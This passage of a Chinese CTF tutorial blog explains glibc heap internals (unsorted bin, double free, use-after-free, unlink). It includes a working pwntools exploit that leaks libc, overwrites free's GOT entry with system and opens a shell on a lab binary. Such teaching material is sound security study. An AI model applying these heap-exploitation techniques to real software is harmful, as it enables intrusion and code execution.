5tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/03/OQh5dAG6sVHC3yM.png" alt="Snipaste_2020-03-02_23-34-20.png"></p><h3 id="unsorted-bin">unsorted bin</h3><p>unsorted bin 是一个存放除 fast_bin 之外 free 掉后的堆块的双向链表。</p><p>small_bin 、 large_bin free 掉之后，第一时间会被放入 unsorted bin</p><p>其中 unsorted bin 会在<strong>下一次</strong> malloc 的时候被检索以及利用，未被利用的区块会被放入 相应的 <strong>bins</strong> ，具体过程如下：</p><blockquote><p>malloc一个不属于 fastbin 大小的 chunk 的时候，会先在 small bin 和 large bin 里面搜索，如果搜到则直接进行使用</p><p>如果没有搜到就搜索 unsorted bin，这个过程中会将 unsorted bin 清空，把区块放入相应的 bin</p><p>如果 unsorted bin 搜索完了之后还没有给申请的 chunk 分配，便会从 top chunk 处进行切割</p><p>​– SuperGate</p></blockquote><h1>double free &amp; use after free</h1><p>double free 的原理是：利用 fastbin 对 fd 不检测的特性，将曾经 free 过的堆块再 free 一次，形成一个循环链表。</p><p>当然也不是说完全没有检测，如果你<strong>连续</strong> free 同一个堆块两次，就会触发 err：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/04/Hj8dh153Mnt6Efi.png" alt="Snipaste_2020-03-04_00-08-13.png"></p><p><strong>例题</strong></p><p><a href="/uploads/Roc826s_Note.zip">Roc826s_Note.zip</a></p><p>这个程序提供了 add、delete、show 功能，模板题。</p><p>由于 system 地址未知，我们需要泄露 libc 的基地址。</p><blockquote><p>需要了解：在 small bin 、large bin free 掉了之后，如果 unsorted bin 的双向链表只有一个堆块，这个堆块的 fd 和 bk 都等于 <strong>main_arena + offset</strong></p></blockquote><p>我们申请一个 small bin 并 free 掉它来获取 libc 基地址。</p><blockquote><p>注意：必须多 malloc 一个其他堆块，否则 small bin 堆块会被合并至 top chunk</p></blockquote><p>前面说过，我们得到了 main_arena + offset 的地址，通过查看内存我们可知 main_arena - 0x8 正是 malloc_hook 的地址，通过这个我们就可以成功通过减法算出 libc_base</p><p>我们通过构造两个 fastbin chunk（P1、P2），按照 P1、P2、P1的顺序 free 掉，这样就会形成 main_arena-&gt;P1-&gt;P2-&gt;P1 的循环链表，这个程序<strong>并没有检测堆块的状态</strong>，所以才能这样攻击。</p><p>然后我们 malloc 三次<strong>同样大小的 fast_bin chunk</strong>，其中在第一次 malloc 时填充 free_got 的地址，目的是后面对其进行修改。</p><p>malloc 第三次时，pmalloc 再次对 P1 进行 malloc，它检测到 user_data 的前八个字节（也就是 fd ）有内容，便被欺骗，将下一个 malloc 的地址设置为我们刚刚写入的 free_got。</p><blockquote><p>这里有一个检测，pmalloc 会在进行下一次 malloc 的时候检测该堆块是否合法。即这个堆块的 size 是否等于 fastbin 的 size （包括 prev_inuse位）</p></blockquote><p>然后我们再次进行写入，由于上方的检测行为，我们应该在 free_got 的地址之前找一块 8Bytes 的区域，这个长整数刚刚等于 fastbin 的size，（包括 prev_inuse位），通常寻找 0x7f，因为 got 表中的大多数地址都被初始化，指向了 libc 的地址。然后用 padding 填充偏移的字符个数，最终就能成功把 got 表修改。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./roc826'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./roc826'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, text=<span class="string">'aa'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content:'</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index?'</span>,str(idx))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment"># make a small bin to start uaf attack</span></span><br><span class="line">add(<span class="number">0x58</span>)   <span class="comment"># fastbin</span></span><br><span class="line">add(<span class="number">0x58</span>)   <span class="comment"># fastbin</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'/bin/sh\x00'</span>)  <span class="comment"># fastbin</span></span><br><span class="line">dele(<span class="number">0</span>)   <span class="comment"># small bin's user data becomes addr of main_arina</span></span><br><span class="line">show(<span class="number">0</span>)   <span class="comment"># show main_arina addr</span></span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x68</span></span><br><span class="line">success(<span class="string">'libc:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)  <span class="comment"># free</span></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment"># free</span></span><br><span class="line">dele(<span class="number">1</span>)  <span class="comment"># make a self-pointed table    fastbin-&gt;node1-&gt;node2-&gt;node1</span></span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0x601ffa</span>))     <span class="comment"># fill fd with the addr of free_got(there is a specified place can serve as a 'size')</span></span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0x601ffa</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0x601ffa</span>))</span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">'aaaaaaaaaaaaaa'</span> + p64(libc_base + libc.symbols[<span class="string">'system'</span>])[:<span class="number">6</span>])</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>unlink</h1><p>（本题先讨论 fake_chunk 在 next_chunk 之前的情况）</p><p>unlink 的前提：<strong>堆块地址明确，并且有一个指针指向相应堆块</strong>。（后面会讲为什么）</p><p>unlink 的原理是：在大堆块的 <strong>user_data</strong> 上伪造一个 fake_chunk （并且在 next_size 上面标记 prev_inuse = 0），利用 unlink 宏，在 free 掉相邻堆块时，</p><ol><li>fake_chunk 会先被从 small_bin / large_bin / unsorted_bin 中<strong>拿出来</strong>，这个<strong>脱离原链表</strong>的过程会调用 <strong>unlink</strong>。</li><li>相邻堆块会与虚假堆块进行<strong>合并</strong>，并且<strong>扩展</strong> fake_chunk 的 size （这一步一般没办法利用）</li></ol><p>我在图中标明了 pre_chunk 和 next_chunk ，但并不代表它们从一开始就是有指针指向的关系的，只是说它们的目标是要合并到一起。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/04/mkN4rQjB9HJ3Zzu.png" alt="Snipaste_2020-03-04_01-08-33.png"></p><p>当然 pmalloc 的安全检测机制没那么简单啦。</p><p>以下是源码中的宏定义：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="comment">// unlink p</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line">    FD = P-&gt;fd;                                                                      \</span><br><span class="line">    BK = P-&gt;bk;                                                                      \</span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      \</span><br><span class="line">        FD-&gt;bk = BK;                                                              \</span><br><span class="line">        BK-&gt;fd = FD;                                                              \</span><br><span class="line">        <span class="comment">// 下面主要考虑 P 对应的 nextsize 双向链表的修改</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">            <span class="comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class="line">            <span class="comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class="line">            <span class="comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      \</span><br><span class="line">            <span class="comment">// 类似于小的 chunk 的检查思路</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);                                              \</span><br><span class="line">            <span class="comment">// 这里说明 P 已经在 nextsize 链表中了。</span></span><br><span class="line">            <span class="comment">// 如果 FD 没有在 nextsize 链表中</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      \</span><br><span class="line">                <span class="comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span></span><br><span class="line">                <span class="comment">// 令 FD 为 nextsize 串起来的</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">                  &#125;                                                              \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 如果在的话，直接拿走即可</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">              &#125;                                                                      \</span><br><span class="line">          &#125;                                                                      \</span><br><span class="line">      &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一言以蔽之，pmalloc 将 fake_chunk 当作 P</p><p>检测：</p><ol><li>P -&gt; fd -&gt; bk == P</li><li>P -&gt; bk -&gt; fd == P</li></ol><p>（注意：<strong>P -&gt; fd != next_chunk</strong>，P -&gt; fd 是一个我们伪造出来的假 chunk）</p><p>这样就不能对数据进行随意修改了，但是，如果我们有一个指向 <strong>fake_chunk</strong> 的 <strong>指针</strong> （通常是在信息管理系统的<strong>指针数组</strong>中存在，这里用 pointer_addr 代替），将</p><ol><li>fake_fd 修改为 pointer_addr - 0x18</li><li>fake_bk 修改为 pointer_addr - 0x10</li></ol><p>就可以绕过检测，因为对于任意一个堆块， fd = chunk_addr + 0x10 ，bk = chunk_addr + 0x18</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/04/pXrh4ZGtnbICvD8.png" alt="Snipaste_2020-03-04_11-45-08.png"></p><p>接下来 堆块之间会进行修改：</p><ol start="2"><li>P -&gt; fd -&gt; bk = P -&gt; bk</li><li>P -&gt; bk -&gt; fd = P -&gt; fd</li></ol><p>由于 <strong>P -&gt; bk -&gt; fd = P -&gt; fd -&gt; bk = List+0</strong> 以及两个操作的先后性，最终 List+0 被修改为 P -&gt; fd，如下图：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7Rxra